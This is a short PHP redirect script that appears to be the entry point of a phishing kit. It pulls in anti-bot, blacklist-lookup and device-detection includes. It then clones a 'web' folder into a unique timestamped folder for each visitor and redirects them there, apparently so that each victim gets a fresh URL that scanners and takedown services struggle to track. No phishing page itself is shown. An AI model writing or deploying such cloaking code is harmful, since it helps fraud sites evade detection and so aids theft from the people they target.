<?php
ob_start();
    require_once('page_config.php');

    $error = 0;

    require_once('includes/device_detect.php');
    require_once('includes/blacklist_lookup.php');
    require_once('includes/functions.php');
    require_once('includes/antibot.php');
   
    $_SESSION['page_a_visited'] = true;

    // Generate random folder for each visitor
    $site_folder_name = "web";
    if ($random_folder == 1){
        if(!isset($_SESSION['user_folder'])){
            $user_folder_name = "u".time();
            full_copy($site_folder_name, $user_folder_name);
            $_SESSION['user_folder'] = $user_folder_name;
            $site_folder_name = $user_folder_name;
            // header("Location: $user_folder_name");
        }else{
            $user_folder = $_SESSION['user_folder'];
            $site_folder_name = $_SESSION['user_folder'];
            // header("Location: $user_folder");
        }
    }else{
        $site_folder_name = "web";
    }

    if($parametercheck==1){
        $get_parameters = get_url_parametrs($_SERVER['REQUEST_URI']);
        if($_GET[$parameter] !== ''){
            $site_folder_name .= $get_parameters;
        }
    }

    if($random_uri==1){
        $site_folder_name .= $uriParametrs;
    }
    
    header("Location: $site_folder_name");
ob_end_flush();
?>